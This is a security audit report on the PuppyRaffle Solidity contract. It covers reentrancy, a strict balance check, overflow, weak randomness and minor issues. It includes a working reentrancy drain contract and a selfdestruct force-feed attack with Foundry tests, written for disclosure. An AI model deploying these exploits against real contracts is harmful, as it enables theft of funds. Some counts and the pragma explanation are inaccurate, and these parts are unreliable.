## Summary

The PuppyRaffle.sol contract has undergone a comprehensive security audit, revealing a total of 10 vulnerabilities. These vulnerabilities have been classified into different severity levels to provide a more detailed understanding of their impact.

High Severity Issues (2): These are critical vulnerabilities that demand immediate attention. Addressing these problems is vital to ensuring the contract's security and integrity.

Medium Severity Findings (2): While not as severe as the high-risk issues, these findings still pose a substantial level of risk and should be prioritized for resolution.

Low Risk and Non-Critical Findings (6): These issues are relatively less critical but are worth addressing to maintain robust security practices and prevent potential future vulnerabilities.

This detailed breakdown of vulnerabilities allows a better assessment of the contract's overall security posture. It emphasizes the importance of addressing high and medium-risk issues promptly while also considering the low-risk findings to enhance the contract's long-term security and stability.

## Vulnerability Details

### High-Risk Issues

1. Reentrancy: The function refund() is prone to reentrancy attack. The Function didn't conform to the Check->Effect->Interaction rule, this action can lead to a reentracy attack. The state variable of players[playerIndex] = address(0), will be updated after the ether has been refunded. An attacker can reenter this function.
   The Proof of concept is below.

### POC

**Contract**
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;
import "../src/PuppyRaffle.sol";

contract AttackRaffle {
PuppyRaffle immutable puppyraffle;

    address public immutable owner;
    uint256 myIndex;

    constructor(address _contractAddress) {
        owner = payable(msg.sender);
        puppyraffle = PuppyRaffle(_contractAddress);
    }

    function destroy(address _puppyContract) external {
        selfdestruct(payable(_puppyContract));
    }

    function playGame(uint256 entranceFee) external payable {
        // start by playing the game.
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyraffle.enterRaffle{value: entranceFee}(players);

        // then the main attack which is the refund function.
        myIndex = puppyraffle.getActivePlayerIndex(address(this));
        puppyraffle.refund(myIndex);
    }

    receive() external payable {
        if (address(puppyraffle).balance > 0) {
            myIndex = puppyraffle.getActivePlayerIndex(address(this));
            puppyraffle.refund(myIndex);
        } else {
            (bool success, ) = (owner).call{value: address(this).balance}("");
            if (!success) revert("Failed Transaction");
        }
    }

}
**Test**

    function test_reenterancy_attack() external {
        // function that allow players enter the game
        testCanEnterRaffleMany();

        // The attack
        address owner = address(23);
        vm.prank(owner);
        attackRaffle = new AttackRaffle(address(puppyRaffle));
        vm.deal(address(attackRaffle), 1 ether);
        console.log(
            "Owner of the Attack Contract balance before the game",
            owner.balance
        );
        console.log(
            "puppyRaffle Contract's balance before contract entered the game",
            address(puppyRaffle).balance
        );
        vm.startPrank(address(attackRaffle));
        attackRaffle.playGame(entranceFee);
        console.log(
            "Owner of the Attack Contract balance after the game",
            attackRaffle.owner().balance
        );

        console.log(
            "puppyRaffle Contract's balance after the game",
            address(puppyRaffle).balance
        );
        vm.stopPrank();
    }

2. The use of strict operator: The function withdrawFees has a strict operation of ==, which can lead to a high vulnerability, when an addition wei or ether is sent to this contract, address(this).balance can never be equal to totalFees. Ether can not be withdrew to the feeAddress.

### POC

**Contract**
function destroy(address \_puppyContract) external {
selfdestruct(payable(\_puppyContract));
}
This is a snippet from the above contract AttactPuppyRaffle.
**Test**
function test_withdraw_attack() external {
// function that select winner
testSelectWinner();

        // The attack
        attackRaffle = new AttackRaffle(address(puppyRaffle));
        vm.deal(address(attackRaffle), 1 wei);
        vm.startPrank(address(attackRaffle));
        attackRaffle.destroy(address(puppyRaffle));

        puppyRaffle.withdrawFees();
        vm.stopPrank();
    }

**NOTE** All the test functions can be added to the PuppyRaffleTest file because testSelectWinner() and testCanEnterRaffleMany() are functions from the file.

### Medium Issue

1. In the function selectWinner(), If at any point in the raffle, the total fee exceeds 18.45 ether there will be an overflow and the totalfee will not be represented well. Why? Because the totalFee was stored with uint64 and the max for uint64 is 18,446,744,073,709,551,615.
2. The winner is deterministic. The use of msg.sender, block.timestamp, block.difficulty and player. length is very predictable especially to the miner.

### Low Issue

1. The was no check for zero address in the contructor, the feeAddress can be deployed with address(0), though it can be changed but it is not best practise.
2. The use of custom errors is the most optimal way for calling error.
3. The was no proper check on the array length on enterRaffle(), this could lead to a DOS attack on the system. The address were not also check if address(0) will be mistakenly included.
4. Unlocked pragma (for e.g. by not using ^ in pragma solidity 0.7.6) can lead the contract to accidentally get deployed using an older compiler version with unfixed bugs
5. Lastly, in gas optimization, it is better to save the length of the array before looping, this helps save gas.

## Impact

1. Reenterancy can lead to loss of the ether in the contract.
2. Strict operators can also lead to loss of ether from the contract.
3. In the function selectWinner() if at any point in the raffle the totalfee exeeds 18.45 ether there will be overflow, loss of funds.
4. The winner to the easy predictable or deterministic undermines the transparency and accountability of the contract
5. Zero checks on address can lead to loss of funds
6. The no proper check on the array length on enterRaffle() can lead to a DOS attack

## Tools Used

Manual Audit

## Recommendations

1. For the reenterancy, it is best practice to always apply the check->effect->interaction.
2. Also make use of a reenterancy lock or modifier to help secure the contract, Openzeppline offers good reenterncy guide.
3. Avoid the use of strict operators
4. Proper address Check
5. Instead of uint64 for the totalFee it is best you use uint256
6. It best to use a more secure and reliably random selection, Chainlink offers a good service on that.
7. The Contract should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.7.6) ensures that contract do not accidentally get deployed using an older compiler version with unfixed bugs.
